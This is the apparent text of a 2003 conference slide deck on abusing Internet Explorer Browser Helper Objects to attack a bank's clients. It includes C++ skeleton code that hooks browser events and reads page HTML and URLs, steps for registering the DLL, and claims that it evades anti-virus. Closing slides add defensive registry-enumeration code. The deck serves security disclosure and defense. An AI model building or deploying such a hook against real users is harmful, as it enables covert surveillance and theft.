• You can either attack the bank…
WHAT CAN YOU DO WHEN YOU WANT TO STEAL MONEY?
• But be careful, security can be tough
• Or you can attack all the customers of the bank

WHAT CAN YOU DO WHEN YOU WANT TO HACK A WEBSITE?
• You can either attack the server…
• But be careful, security can be tough
Firewall, intrusion 
detection, anti-virus, …
• This is what I will teach you today
• Or you can attack all the clients

• Requires Internet explorer 4.0 and Windows 95 or later
 Google Zeitgeist (http://www.google.com/press/zeitgeist.html) shows that more than 90% of 
the Google requests come from Windows – Internet Explorer
• Requires DLL registration
 An executable must be run once with “Power user” privileges
 Many privilege escalation and code execution from a webpage without user intervention 
have been discovered
• As you will see through this presentation, the attack is extremely generic and can lead to a lot of 
malicious scenarii.
SCOPE OF THE SECURITY VULNERABILITY
9
(c) 2003 Twingo Systems, Confidential
ADVANTAGES OF THE ATTACK
• No modification on the targeted server is required
• The attack uses a feature developped by Internet Explorer!!!
 Microsoft provides and supports all the required tools
• The installed DLL cannot be detected by anti-virus. This is a standard DLL with no specific 
signature or whatsoever
• You can “personalize” the attack for all the clients
• You can attack only one client

• Implemented as COM in-process DLL and loaded by Internet Explorer.
• The browser initializes the object and asks it for a certain interface. If that interface is found, 
Internet Explorer uses the methods provided to pass its IUnknown pointer down to the helper object
• Implemented also in Explorer
• See Dino Esposito article “Browser Helper Objects: The Browser the Way You Want It” in MSDN
INTRODUCING BROWSER HELPER OBJECTS
12
(c) 2003 Twingo Systems, Confidential
• The IObjectWithSite Interface: HRESULT SetSite( IUnknown* pUnkSite )
 Receives the IUnknown pointer of the browser. The typical implementation will simply store such a 
pointer for further use
HRESULT SetSite( IUnknown* pUnkSite )
{
if ( pUnkSite != NULL ) {
m_spWebBrowser2 = pUnkSite;
if ( m_spWebBrowser2 ) {
// Connect to the browser in order to handle events
if ( ! ManageConnection( Advise ) )
MessageBox( NULL, "Error", "Error", MB_ICONERROR );
}
}
return S_OK;
}
ACCESSING THE INTERFACE OF THE BROWSER
13
(c) 2003 Twingo Systems, Confidential
• The IConnectionPoint interface: HRESULT Connect( void )
 To intercept the events fired by the browser, the BHO needs to connect to it via an IConnectionPoint 
interface and pass the IDispatch table of the functions that will handle the various events
HRESULT Connect( void )
{
HRESULT hr;
CComPtr spCP;
// Receives the connection point for WebBrowser events
hr = m_spCPC->FindConnectionPoint( DIID_DWebBrowserEvents2, &spCP );
if ( FAILED( hr ) )
return hr;
// Pass our event handlers to the container. Each time an event occurs
// the container will invoke the functions of the IDispatch interface we implemented
hr = spCP->Advise( reinterpret_cast(this), &m_dwCookie );
return hr;
}
GETTING THE BROWSER EVENTS
14
(c) 2003 Twingo Systems, Confidential
STDMETHODIMP Invoke( DISPID dispidMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS*
pDispParams, VARIANT* pvarResult, EXCEPINFO* pExcepInfo,  UINT* puArgErr )
{
CComPtr spDisp;
if ( dispidMember == DISPID_DOCUMENTCOMPLETE ) {
m_spWebBrowser2 = pDispParams->rgvarg[1].pdispVal;
CComPtr pDisp;
HRESULT hr = m_spWebBrowser2->get_Document( &pDisp );
if ( FAILED( hr ) ) break;
CComQIPtr spHTML;
spHTML = pDisp;
if ( spHTML ) {
// Get the BODY object
CComPtr m_pBody;
hr = spHTML->get_body( &m_pBody ); 
// Get the HTML text
BSTR bstrHTMLText;
hr = m_pBody->get_outerHTML( &bstrHTMLText ); 
// Get the URL
CComBSTR url;
m_spWebBrowser2->get_LocationURL( &url );
}
}
return S_OK;
}
ACCESSING THE DOCUMENT OBJECT
15
(c) 2003 Twingo Systems, Confidential
• Register the DLL (regsvr32.exe myBHO.dll for instance) and create a key in 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft \Windows\CurrentVersion\Explorer\Browser 
Helper Objects with the GUID of the component
 The next instance of Internet Explorer will automatically load the BHO

SOME POSSIBLE DEFENSES
• Disable all or selected BHOs installed on the client
 Simply Enumerate the BHOs from the registry and analyze the DLL information (see code on the 
DefCon CD)
HKEY hkey;
TCHAR szPath = “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects”;
If ( RegOpenKey( HKEY_LOCAL_MACHINE, szPath, &hkey ) == ERROR_SUCCESS ) {
TCHAR szGUID[255];
LONG ret = RegEnumKey( HKEY_LOCAL_MACHINE, 0, szGUID, 255 );
Int i = 0;
while ( ( ret != ERROR_NO_MORE_ITEMS ) && ( ret == ERROR_SUCCESS ) ) {
// You have the BHO GUID in szGUID
ret = RegEnumKey ( HKEY_LOCAL_MACHINE, i, szGUID, 255 );
i++;
}
}
• Main drawback: Pretty painful as BHOs can be sometimes useful
 Acrobat plug-in is a BHO, Google toolbar uses BHO, …
18
(c) 2003 Twingo Systems, Confidential
SOME POSSIBLE OTHER DEFENSES
• Microsoft could improve BHO support in coming releases of Internet Explorer
 Create a tag  to disable all BHOs for a given web page
 Implement an authentication system to disable only non approved BHOs (implementation of 
a tag )

• Attack can be selective, personalized
 The malicious can connect to an external website and download specific information
• You should not trust what you see (especially if this is not your computer)
• Use BHOWatcher to regurarly check the BHO installed on your computer
